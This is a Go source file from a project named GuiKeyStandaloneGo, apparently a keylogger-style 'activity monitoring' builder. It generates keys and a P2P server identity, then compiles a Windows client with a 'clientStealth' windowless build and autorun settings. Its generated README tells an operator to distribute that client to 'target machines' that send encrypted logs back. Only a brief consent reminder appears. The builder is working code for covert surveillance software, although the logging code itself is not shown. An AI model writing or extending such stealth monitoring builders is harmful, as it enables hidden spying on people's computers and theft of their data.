// File: GuiKeyStandaloneGo/generator/core/generate.go
package core

import (
	"bytes"
	"fmt"
	"html/template"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"

	// "runtime" // No longer needed for template path resolution
	"strings"
	"time"

	"github.com/RIZAmohammadkhan/GuiKeyStandaloneGo/gui_generator_app/pkg/config"

	"github.com/RIZAmohammadkhan/GuiKeyStandaloneGo/gui_generator_app/pkg/crypto"

	"github.com/libp2p/go-libp2p/core/peer"
)

type GeneratorSettings struct {
	OutputDirPath         string
	BootstrapAddresses    string
	ClientConfigOverrides config.ClientSettings
	ServerConfigOverrides config.ServerSettings
	GoExecutablePath      string                               // Path to the go executable (e.g., "go" or "/path/to/extracted/go.exe")
	TemplatesBasePath     string                               // Base path where 'client_template' and 'server_template' dirs reside
	ProgressCallback      func(message string, percentage int) // Callback for GUI/CLI progress
}

type GeneratedInfo struct {
	AppClientID           string
	AppEncryptionKeyHex   string
	ServerPeerID          string
	ServerIdentitySeedHex string
	ReadmeContent         string
	FullOutputDir         string
}

const readmeTemplate = `Activity Monitoring Suite - Generated Packages (P2P Mode)
========================================================

This package was generated by the GuiKeyStandaloneGo Generator on {{.Timestamp}}.

Generated App-Level Client ID (for logs): {{.Generated.AppClientID}}
Generated App-Level Encryption Key (Hex): {{.Generated.AppEncryptionKeyHex}}
Generated Server Libp2p Peer ID: {{.Generated.ServerPeerID}}
Generated Server Libp2p Identity Seed (Hex): {{.Generated.ServerIdentitySeedHex}}

Instructions:
------------

1. Local Log Server (For Your Machine - The Operator):
   - The 'LocalLogServer_Package' directory contains the server application and its configuration.
   - It also contains 'web_templates' and 'static' subdirectories for the UI.
   - Run '{{.ServerExeName}}' from within this directory.
   - Server P2P Listen Address (configured): {{.ServerConfig.ListenAddress}}
   - Server Web UI Listen Address: {{.ServerConfig.WebUIListenAddress}}
   - Access Web UI at: http://{{.WebUIAccessAddress}}/logs
   - Server Bootstrap Addresses: {{range .ServerConfig.BootstrapAddresses}}{{.}} {{end}}
   - Server Log File: {{.ServerConfig.InternalLogFileDir}}/{{.ServerConfig.InternalLogFileName}} (Level: {{.ServerConfig.InternalLogLevel}})

2. Activity Monitor Client (For Distribution to Target Machines):
   - The 'ActivityMonitorClient_Package' directory contains the client application.
   - Distribute the *contents* of this directory to the machine(s) you want to monitor.
   - Run '{{.ClientExeName}}' on the target machine(s).
   - It is configured to connect to Server Peer ID: {{.Generated.ServerPeerID}}
   - It will use these bootstrap multiaddresses: {{range .ClientConfig.BootstrapAddresses}}{{.}} {{end}}
   - Client Log File: {{.ClientConfig.InternalLogFileDir}}/{{.ClientConfig.InternalLogFileName}} (Level: {{.ClientConfig.InternalLogLevel}})

Security Considerations:
- The app-level encryption key is vital for data confidentiality. Keep it secure.
- The server's libp2p identity seed is critical.
- Secure the machine running the Local Log Server.
- Ensure proper consent and adhere to privacy laws when deploying the client monitor.
`

const clientGeneratedConfigTemplate = `// Code generated by GuiKeyStandaloneGo generator. DO NOT EDIT.
package main 

const (
	CfgServerPeerID                       = "{{.ServerPeerID}}"
	CfgEncryptionKeyHex                   = "{{.EncryptionKeyHex}}"
	CfgClientID                           = "{{.ClientID}}"
	CfgSyncIntervalSecs                   = {{.SyncIntervalSecs}}
	CfgProcessorPeriodicFlushIntervalSecs = {{.ProcessorPeriodicFlushIntervalSecs}}
	CfgInternalLogLevel                   = "{{.InternalLogLevel}}"
	CfgLogFilePath                        = ` + "`{{.LogFilePath}}`" + ` 
	CfgAppNameForAutorun                  = "{{.AppNameForAutorun}}"
	CfgLocalLogCacheRetentionDays         = {{.LocalLogCacheRetentionDays}}
	CfgRetryIntervalOnFailSecs            = {{.RetryIntervalOnFailSecs}}
	CfgMaxRetriesPerBatch                 = {{.MaxRetriesPerBatch}}
	CfgMaxEventsPerSyncBatch              = {{.MaxEventsPerSyncBatch}}
	CfgInternalLogFileDir                 = ` + "`{{.InternalLogFileDir}}`" + `
	CfgInternalLogFileName                = "{{.InternalLogFileName}}"
)

var CfgBootstrapAddresses = []string{
{{range .BootstrapAddresses}}	` + "`{{.}}`," + `
{{end}}}

{{if .MaxLogFileSizeMBIsSet}}
var CfgMaxLogFileSizeMBValue = uint64({{.MaxLogFileSizeMBValue}})
var CfgMaxLogFileSizeMB = &CfgMaxLogFileSizeMBValue
{{else}}
var CfgMaxLogFileSizeMB *uint64 = nil
{{end}}
`

const serverGeneratedConfigTemplate = `// Code generated by GuiKeyStandaloneGo generator. DO NOT EDIT.
package main

const (
	CfgP2PListenAddress            = "{{.ListenAddress}}"
	CfgWebUIListenAddress          = "{{.WebUIListenAddress}}"
	CfgEncryptionKeyHex            = "{{.EncryptionKeyHex}}"
	CfgServerIdentityKeySeedHex    = "{{.ServerIdentityKeySeedHex}}"
	CfgDatabasePath                = ` + "`{{.DatabasePath}}`" + `
	CfgLogRetentionDays            = {{.LogRetentionDays}}
	CfgLogDeletionCheckIntervalHrs = {{.LogDeletionCheckIntervalHrs}}
	CfgInternalLogLevel            = "{{.InternalLogLevel}}"      
	CfgInternalLogFileDir          = ` + "`{{.InternalLogFileDir}}`" + `   
	CfgInternalLogFileName         = "{{.InternalLogFileName}}"      
)

var CfgBootstrapAddresses = []string{
{{range .BootstrapAddresses}}	` + "`{{.}}`," + `
{{end}}}
`

func PerformGeneration(genSettings *GeneratorSettings) (GeneratedInfo, error) {
	var genInfo GeneratedInfo
	if genSettings.ProgressCallback == nil {
		genSettings.ProgressCallback = func(message string, percentage int) {
			log.Printf("[core-progress %d%%] %s", percentage, message)
		}
	}

	genSettings.ProgressCallback("Starting generation process...", 0)
	log.Println("[core] PerformGeneration started.")

	if genSettings.OutputDirPath == "" {
		return genInfo, fmt.Errorf("output directory is not set")
	}
	if genSettings.GoExecutablePath == "" {
		// For CLI, this might default to "go" if not provided by the CLI main.
		// For GUI, this path MUST be the path to the extracted go.exe.
		// We'll let it proceed and fail at compileGoTemplate if it's still empty there.
		log.Println("[core] WARNING: GoExecutablePath is empty in GeneratorSettings. Compilation will likely use 'go' from PATH or fail if not found.")
	}
	if genSettings.TemplatesBasePath == "" {
		return genInfo, fmt.Errorf("templates base path not provided in settings (TemplatesBasePath is empty)")
	}

	absOutputDir, err := filepath.Abs(genSettings.OutputDirPath)
	if err != nil {
		return genInfo, fmt.Errorf("failed to get absolute path for output directory %s: %w", genSettings.OutputDirPath, err)
	}
	genInfo.FullOutputDir = absOutputDir
	if err := os.MkdirAll(absOutputDir, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create output directory %s: %w", absOutputDir, err)
	}
	genSettings.ProgressCallback(fmt.Sprintf("Output directory ensured at %s", absOutputDir), 5)
	log.Printf("[core] Output directory: %s", absOutputDir)

	genInfo.AppClientID = crypto.GenerateAppClientID()
	aesKeyBytes, err := crypto.GenerateAESKeyBytes()
	if err != nil {
		return genInfo, fmt.Errorf("failed to generate AES key: %w", err)
	}
	genInfo.AppEncryptionKeyHex = fmt.Sprintf("%x", aesKeyBytes)
	genSettings.ProgressCallback("App Client ID and Encryption Key generated.", 10)

	serverIdentitySeedHex, err := crypto.GenerateLibp2pIdentitySeedHex()
	if err != nil {
		return genInfo, fmt.Errorf("failed to generate server identity seed: %w", err)
	}
	genInfo.ServerIdentitySeedHex = serverIdentitySeedHex
	serverPrivKey, _, err := crypto.Libp2pKeyFromSeedHex(serverIdentitySeedHex)
	if err != nil {
		return genInfo, fmt.Errorf("failed to derive server libp2p key: %w", err)
	}
	serverPID, err := peer.IDFromPrivateKey(serverPrivKey)
	if err != nil {
		return genInfo, fmt.Errorf("failed to get server peer ID: %w", err)
	}
	genInfo.ServerPeerID = serverPID.String()
	genSettings.ProgressCallback(fmt.Sprintf("Server Peer ID (%s) and Identity Seed generated.", genInfo.ServerPeerID), 15)
	log.Printf("[core] Generated Server Peer ID: %s", genInfo.ServerPeerID)

	clientCfgValues := config.DefaultClientSettings()
	clientCfgValues.ClientID = genInfo.AppClientID
	clientCfgValues.EncryptionKeyHex = genInfo.AppEncryptionKeyHex
	clientCfgValues.ServerPeerID = genInfo.ServerPeerID
	if genSettings.BootstrapAddresses != "" {
		addrs := strings.Split(genSettings.BootstrapAddresses, ",")
		clientCfgValues.BootstrapAddresses = make([]string, 0, len(addrs))
		for _, addr := range addrs {
			trimmedAddr := strings.TrimSpace(addr)
			if trimmedAddr != "" {
				clientCfgValues.BootstrapAddresses = append(clientCfgValues.BootstrapAddresses, trimmedAddr)
			}
		}
	}
	genSettings.ProgressCallback("Client configuration values prepared.", 20)

	serverCfgValues := config.DefaultServerSettings()
	serverCfgValues.EncryptionKeyHex = genInfo.AppEncryptionKeyHex
	serverCfgValues.ServerIdentityKeySeedHex = genInfo.ServerIdentitySeedHex
	if len(clientCfgValues.BootstrapAddresses) > 0 {
		serverCfgValues.BootstrapAddresses = make([]string, len(clientCfgValues.BootstrapAddresses))
		copy(serverCfgValues.BootstrapAddresses, clientCfgValues.BootstrapAddresses)
	} else {
		serverCfgValues.BootstrapAddresses = []string{}
	}
	genSettings.ProgressCallback("Server configuration values prepared.", 25)

	// Use the TemplatesBasePath provided in settings
	templatesBaseDir := genSettings.TemplatesBasePath
	log.Printf("[core] Using TemplatesBasePath from settings: %s", templatesBaseDir)

	clientSrcPath := filepath.Join(templatesBaseDir, "client_template")
	serverSrcPath := filepath.Join(templatesBaseDir, "server_template")
	log.Printf("[core] Resolved client_template source path: %s", clientSrcPath)
	log.Printf("[core] Resolved server_template source path: %s", serverSrcPath)

	// Verify that these template source paths actually exist before proceeding
	if _, errStat := os.Stat(clientSrcPath); os.IsNotExist(errStat) {
		err := fmt.Errorf("client template source path does not exist: '%s'. Check TemplatesBasePath ('%s') and ensure 'client_template' subdirectory is present", clientSrcPath, templatesBaseDir)
		log.Printf("[core] ERROR: %v", err)
		return genInfo, err
	}
	if _, errStat := os.Stat(serverSrcPath); os.IsNotExist(errStat) {
		err := fmt.Errorf("server template source path does not exist: '%s'. Check TemplatesBasePath ('%s') and ensure 'server_template' subdirectory is present", serverSrcPath, templatesBaseDir)
		log.Printf("[core] ERROR: %v", err)
		return genInfo, err
	}

	clientExeName := "activity_monitor_client.exe"
	serverExeName := "local_log_server.exe"

	clientPackagePath := filepath.Join(absOutputDir, "ActivityMonitorClient_Package")
	serverPackagePath := filepath.Join(absOutputDir, "LocalLogServer_Package")

	if err := os.MkdirAll(clientPackagePath, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create client package dir: %w", err)
	}
	if err := os.MkdirAll(serverPackagePath, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create server package dir: %w", err)
	}
	genSettings.ProgressCallback("Package directories created.", 30)

	clientTemplateData := struct {
		config.ClientSettings
		MaxLogFileSizeMBIsSet bool
		MaxLogFileSizeMBValue uint64
	}{ClientSettings: clientCfgValues}
	if clientCfgValues.MaxLogFileSizeMB != nil {
		clientTemplateData.MaxLogFileSizeMBIsSet = true
		clientTemplateData.MaxLogFileSizeMBValue = *clientCfgValues.MaxLogFileSizeMB
	}

	clientGeneratedGoPath := filepath.Join(clientSrcPath, "config_generated.go")
	if err := writeGoConfig(clientGeneratedGoPath, clientGeneratedConfigTemplate, clientTemplateData); err != nil {
		return genInfo, fmt.Errorf("failed to write client_generated_config.go: %w", err)
	}
	genSettings.ProgressCallback("Client Go config file generated.", 35)
	log.Printf("[core] Wrote client config to: %s", clientGeneratedGoPath)

	serverGeneratedGoPath := filepath.Join(serverSrcPath, "config_generated.go")
	if err := writeGoConfig(serverGeneratedGoPath, serverGeneratedConfigTemplate, serverCfgValues); err != nil {
		return genInfo, fmt.Errorf("failed to write server_generated_config.go: %w", err)
	}
	genSettings.ProgressCallback("Server Go config file generated.", 40)
	log.Printf("[core] Wrote server config to: %s", serverGeneratedGoPath)

	defer func() {
		log.Printf("[core] Attempting to remove temporary config file: %s", clientGeneratedGoPath)
		if err := os.Remove(clientGeneratedGoPath); err != nil && !os.IsNotExist(err) {
			log.Printf("[core] WARNING: Failed to remove client_generated_config.go: %v", err)
		}
		log.Printf("[core] Attempting to remove temporary config file: %s", serverGeneratedGoPath)
		if err := os.Remove(serverGeneratedGoPath); err != nil && !os.IsNotExist(err) {
			log.Printf("[core] WARNING: Failed to remove server_generated_config.go: %v", err)
		}
		genSettings.ProgressCallback("Cleaned up temporary Go config files.", 98)
	}()

	clientOutPath := filepath.Join(clientPackagePath, clientExeName)
	serverOutPath := filepath.Join(serverPackagePath, serverExeName)

	genSettings.ProgressCallback(fmt.Sprintf("Compiling client template from %s...", clientSrcPath), 45)
	if err := compileGoTemplate(clientSrcPath, clientOutPath, true, genSettings.GoExecutablePath); err != nil {
		return genInfo, fmt.Errorf("failed to compile client template: %w", err)
	}
	genSettings.ProgressCallback("Client template compiled.", 60)

	genSettings.ProgressCallback(fmt.Sprintf("Compiling server template from %s...", serverSrcPath), 65)
	if err := compileGoTemplate(serverSrcPath, serverOutPath, false, genSettings.GoExecutablePath); err != nil {
		return genInfo, fmt.Errorf("failed to compile server template: %w", err)
	}
	genSettings.ProgressCallback("Server template compiled.", 80)

	serverPackageStaticDir := filepath.Join(serverPackagePath, "static")
	serverPackageTemplatesDir := filepath.Join(serverPackagePath, "web_templates")

	// Source paths for static/web_templates are relative to the serverSrcPath
	sourceStaticDir := filepath.Join(serverSrcPath, "static")
	sourceWebTemplatesDir := filepath.Join(serverSrcPath, "web_templates")
	log.Printf("[core] Copying server static assets from: %s", sourceStaticDir)
	log.Printf("[core] Copying server web templates from: %s", sourceWebTemplatesDir)

	if err := copyDir(sourceStaticDir, serverPackageStaticDir); err != nil {
		log.Printf("[core] Warning: Failed to copy server static assets from %s: %v", sourceStaticDir, err)
	}
	if err := copyDir(sourceWebTemplatesDir, serverPackageTemplatesDir); err != nil {
		log.Printf("[core] Warning: Failed to copy server HTML templates from %s: %v", sourceWebTemplatesDir, err)
	}
	genSettings.ProgressCallback("Server UI assets copied.", 85)

	readmeData := struct {
		Timestamp          string
		Generated          GeneratedInfo // This refers to the local genInfo, not the struct type
		ClientConfig       config.ClientSettings
		ServerConfig       config.ServerSettings
		ClientExeName      string
		ServerExeName      string
		WebUIAccessAddress string
	}{
		Timestamp:          time.Now().Format(time.RFC1123),
		Generated:          genInfo, // Pass the populated genInfo struct
		ClientConfig:       clientCfgValues,
		ServerConfig:       serverCfgValues,
		ClientExeName:      clientExeName,
		ServerExeName:      serverExeName,
		WebUIAccessAddress: strings.Replace(serverCfgValues.WebUIListenAddress, "0.0.0.0", "127.0.0.1", 1),
	}
	tmplReadme, err := template.New("readme").Parse(readmeTemplate)
	if err != nil {
		return genInfo, fmt.Errorf("failed to parse README template: %w", err)
	}
	var readmeBuf bytes.Buffer
	if err := tmplReadme.Execute(&readmeBuf, readmeData); err != nil {
		return genInfo, fmt.Errorf("failed to execute README template to buffer: %w", err)
	}
	genInfo.ReadmeContent = readmeBuf.String() // Store for GUI

	readmeFilePath := filepath.Join(absOutputDir, "README_IMPORTANT_INSTRUCTIONS.txt")
	readmeFile, err := os.Create(readmeFilePath)
	if err != nil {
		return genInfo, fmt.Errorf("failed to create README file %s: %w", readmeFilePath, err)
	}
	defer readmeFile.Close()
	if _, err := readmeFile.WriteString(genInfo.ReadmeContent); err != nil {
		return genInfo, fmt.Errorf("failed to write README content to file: %w", err)
	}
	genSettings.ProgressCallback("README generated.", 95)
	log.Printf("[core] Wrote README to: %s", readmeFilePath)

	finalMsg := fmt.Sprintf("Generation process completed successfully! Packages in: %s", absOutputDir)
	genSettings.ProgressCallback(finalMsg, 100)
	log.Printf("[core] %s", finalMsg)
	return genInfo, nil
}

func writeGoConfig(path string, goTemplateContent string, cfgData interface{}) error {
	tmpl, err := template.New("goconfig").Parse(goTemplateContent)
	if err != nil {
		return fmt.Errorf("parsing Go config template for %s: %w", filepath.Base(path), err)
	}
	parentDir := filepath.Dir(path)
	if err := os.MkdirAll(parentDir, 0755); err != nil { // Should already exist if TemplatesBasePath is correct
		log.Printf("[core] Info: Attempted to create parent dir %s for generated Go config (might already exist or path is wrong)", parentDir)
		// return fmt.Errorf("creating parent directory %s for generated Go config: %w", parentDir, err)
	}
	file, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("creating generated Go config file %s: %w", path, err)
	}
	defer file.Close()
	if err := tmpl.Execute(file, cfgData); err != nil {
		return fmt.Errorf("executing Go config template for %s: %w", filepath.Base(path), err)
	}
	return nil
}

func compileGoTemplate(srcDir, outputPath string, clientStealth bool, goExecutable string) error {
	effectiveGoExecutable := goExecutable
	if effectiveGoExecutable == "" {
		effectiveGoExecutable = "go" // Default to "go" in PATH if not specified
		log.Printf("[core-compile] GoExecutablePath not provided, defaulting to '%s' from PATH for compiling %s", effectiveGoExecutable, srcDir)
	}

	args := []string{"build", "-v", "-o", outputPath}
	buildEnv := append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	var ldflags []string
	if clientStealth {
		ldflags = append(ldflags, "-H=windowsgui")
	}
	ldflags = append(ldflags, "-s", "-w") // For smaller binaries

	if len(ldflags) > 0 {
		args = append(args, "-ldflags="+strings.Join(ldflags, " "))
	}
	args = append(args, ".") // Build the package in srcDir

	cmd := exec.Command(effectiveGoExecutable, args...)
	cmd.Dir = srcDir
	cmd.Env = buildEnv

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	log.Printf("[core-compile] Running build: %s %s (Env: GOOS=%s GOARCH=%s CGO_ENABLED=%s) in %s",
		effectiveGoExecutable, strings.Join(args, " "),
		buildEnvValueFor("GOOS", cmd.Env), buildEnvValueFor("GOARCH", cmd.Env),
		buildEnvValueFor("CGO_ENABLED", cmd.Env),
		cmd.Dir)

	startTime := time.Now()
	if err := cmd.Run(); err != nil {
		errMsg := fmt.Sprintf("failed to compile %s (command: %s %s): %v\nStdout: %s\nStderr: %s",
			filepath.Base(srcDir), effectiveGoExecutable, strings.Join(args, " "), err, stdout.String(), stderr.String())
		log.Printf("[core-compile] ERROR: %s", errMsg)
		return fmt.Errorf(errMsg)
	}
	duration := time.Since(startTime)
	log.Printf("[core-compile] Successfully compiled %s to %s in %v. Output:\n%s", filepath.Base(srcDir), outputPath, duration, stdout.String())
	if stderr.Len() > 0 {
		log.Printf("[core-compile] Stderr during compilation of %s:\n%s", filepath.Base(srcDir), stderr.String())
	}
	return nil
}

func buildEnvValueFor(key string, env []string) string {
	prefix := key + "="
	for _, entry := range env {
		if strings.HasPrefix(entry, prefix) {
			return entry[len(prefix):]
		}
	}
	return ""
}

func copyDir(src string, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		if os.IsNotExist(err) {
			log.Printf("[core-copy] Info: Source directory %s does not exist, skipping copy.", src)
			return nil // Not an error if source doesn't exist (e.g., optional assets)
		}
		return fmt.Errorf("stating source dir %s: %w", src, err)
	}
	if !srcInfo.IsDir() {
		return fmt.Errorf("source %s is not a directory", src)
	}
	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
		return fmt.Errorf("creating dest dir %s: %w", dst, err)
	}
	entries, err := os.ReadDir(src)
	if err != nil {
		return fmt.Errorf("reading source dir %s: %w", src, err)
	}
	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())
		if entry.IsDir() {
			if err := copyDir(srcPath, dstPath); err != nil {
				return err // Propagate error
			}
		} else {
			srcFile, errF := os.Open(srcPath)
			if errF != nil {
				return fmt.Errorf("opening source file %s: %w", srcPath, errF)
			}
			dstFile, errC := os.Create(dstPath)
			if errC != nil {
				srcFile.Close()
				return fmt.Errorf("creating dest file %s: %w", dstPath, errC)
			}
			if _, errCP := io.Copy(dstFile, srcFile); errCP != nil {
				srcFile.Close()
				dstFile.Close()
				return fmt.Errorf("copying %s to %s: %w", srcPath, dstPath, errCP)
			}
			srcFile.Close()
			dstFile.Close()
			// Preserve permissions
			fileInfo, errI := entry.Info()
			if errI == nil {
				if errC := os.Chmod(dstPath, fileInfo.Mode()); errC != nil {
					log.Printf("[core-copy] Warning: could not chmod %s: %v", dstPath, errC)
				}
			} else {
				log.Printf("[core-copy] Warning: could not get FileInfo for %s to copy mode: %v", srcPath, errI)
			}
		}
	}
	return nil
}
